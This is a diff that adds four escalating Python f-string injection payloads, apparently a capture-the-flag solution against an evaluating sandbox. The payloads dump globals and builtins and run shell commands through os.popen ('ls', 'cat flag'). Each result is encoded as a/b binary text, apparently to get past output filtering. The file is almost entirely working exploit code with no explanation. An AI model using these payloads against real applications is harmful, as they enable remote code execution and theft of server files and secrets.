@@ -1,0 +1,7 @@
+[["num", "\"f\\'{\\\"\\\".join([\\\"0\\\" * (8-len(bin(n)[2:])) + bin(n)[2:] for n in bytes(str(globals()), \\\"utf-8\\\")]).replace(\\\"0\\\",\\\"a\\\").replace(\\\"1\\\",\\\"b\\\")}\\'\""]]
+
+[["num", "\"f\\'{\\\"\\\".join([\\\"0\\\" * (8-len(bin(n)[2:])) + bin(n)[2:] for n in bytes(str(globals()[\\\"__builtins__\\\"]), \\\"utf-8\\\")]).replace(\\\"0\\\",\\\"a\\\").replace(\\\"1\\\",\\\"b\\\")}\\'\""]]
+
+[["num", "\"f\\'{\\\"\\\".join([\\\"0\\\" * (8-len(bin(n)[2:])) + bin(n)[2:] for n in bytes(__import__(\\\"os\\\").popen(\\\"ls\\\").read(), \\\"utf-8\\\")]).replace(\\\"0\\\",\\\"a\\\").replace(\\\"1\\\",\\\"b\\\")}\\'\""]]
+
+[["num", "\"f\\'{\\\"\\\".join([\\\"0\\\" * (8-len(bin(n)[2:])) + bin(n)[2:] for n in bytes(__import__(\\\"os\\\").popen(\\\"cat flag\\\").read(), \\\"utf-8\\\")]).replace(\\\"0\\\",\\\"a\\\").replace(\\\"1\\\",\\\"b\\\")}\\'\""]]
